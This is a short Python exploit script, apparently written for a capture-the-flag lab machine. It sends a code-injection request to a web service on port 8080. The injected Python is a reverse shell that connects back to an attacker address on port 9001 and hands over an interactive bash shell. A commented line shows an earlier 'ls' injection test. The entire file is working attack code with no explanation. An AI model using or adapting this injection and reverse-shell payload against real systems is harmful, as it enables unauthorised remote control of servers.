import requests as req
reverse_shell = 'x=socket.socket(socket.AF_INET,socket.SOCK_STREAM);x.connect((\"10.10.14.48\",9001));os.dup2(x.fileno(),0); os.dup2(x.fileno(),1); os.dup2(x.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'
cmd = "';"+reverse_shell+"'\""
url = "http://10.10.10.168:8080/"+cmd
r =req.get(url)
print(r.content)
#print(info.format("'';ls"))
